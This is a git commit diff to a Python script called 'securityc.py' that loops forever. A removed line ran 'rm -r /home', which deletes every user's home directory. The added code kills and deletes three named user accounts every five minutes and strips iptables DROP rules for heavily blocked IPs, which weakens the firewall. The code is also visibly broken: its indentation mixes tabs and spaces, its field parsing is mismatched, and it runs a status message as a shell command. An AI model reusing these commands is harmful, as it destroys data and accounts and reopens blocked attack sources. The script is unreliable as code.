866a23350cd21917b218f3aca022f8c082b8496c
mrkiller90 <136891488+mrkiller90@users.noreply.github.com>
2023-07-07 00:34:52 +0330

    Add files via upload

--- securityc.py
+++ securityc.py
@@ -1,6 +1,21 @@
 import time
 import os
+def delete_blocked_ips():
+    command = 'iptables -L INPUT -v -n | awk \'!/^$|Chain|pkts/ {print $1" "$2" "$8}\''
+    output = os.popen(command).read()
+    lines = output.strip().split('\n')
+    for line in lines:
+        fields = line.split()
+        ip = fields[1]
+        packets = int(fields[2])
+        if packets > 2000:
+            os.system('iptables -D INPUT -s ' + ip + ' -j DROP')
 while True:
-    os.system("rm -r /home f4cabs")
-    os.system("rn -r /home s")
-    time.sleep(300)
+	try:
+        os.system("sudo killall -u f4cabs & deluser f4cabs")
+        os.system("sudo killall -u s & deluser s")
+        os.system("sudo killall -u meo092t & deluser meo092t")
+        delete_blocked_ips()
+        time.sleep(300)
+    except:
+    	os.system("Script Is Running.... Dont Worry ;)")
